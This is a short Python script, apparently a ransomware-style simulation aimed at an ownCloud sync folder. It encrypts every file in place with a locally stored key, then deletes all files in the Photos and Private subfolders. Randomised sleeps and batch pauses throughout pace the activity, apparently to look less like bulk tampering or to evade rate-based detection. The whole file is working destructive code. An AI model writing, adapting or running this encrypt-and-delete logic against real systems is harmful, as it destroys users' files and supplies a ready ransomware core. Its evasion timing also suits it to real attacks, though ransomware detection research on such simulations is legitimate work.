import glob
import os
import random
import time

from encriptor import Encryptor

# path para pasta sincronizada
PATH = "/home/pedralmeida/Documents/owncloud/"


def main():
    encryptor = Encryptor()
    mykey = encryptor.key_create()
    encryptor.key_write(mykey, 'mykey.key')
    loaded_key = encryptor.key_load('mykey.key')

    files = [f for f in glob.glob(PATH + "**/*", recursive=True)]
    print("Encrypting...")
    count = 0
    count2 = 0
    for f in files:
        if count >= 75:
            time.sleep(random.randint(20, 80))
            count = 0

        if count2 >= 20:
            time.sleep(random.randint(8, 15))
            count2 = 0

        if os.path.isfile(f):
            print(f)
            encryptor.file_encrypt(loaded_key, f, f)
            time.sleep(0.2)
            count += 1

    time.sleep(random.randint(10, 30))

    print("\n\nDeleting...")
    files = [f for f in glob.glob(PATH + "/Photos/" + "**/*", recursive=True)]
    count = 0
    for f in files:
        if count >= 30:
            time.sleep(random.randint(15, 60))
            count = 0

        if os.path.isfile(f):
            print(f)
            os.remove(f)
            count += 1

    time.sleep(random.randint(10, 30))

    files = [f for f in glob.glob(PATH + "/Private/" + "**/*", recursive=True)]
    count = 0
    for f in files:
        if count >= 30:
            time.sleep(random.randint(2, 5))
            count = 0

        if os.path.isfile(f):
            print(f)
            os.remove(f)
            time.sleep(0.2)
            count += 1


if __name__ == '__main__':
    main()
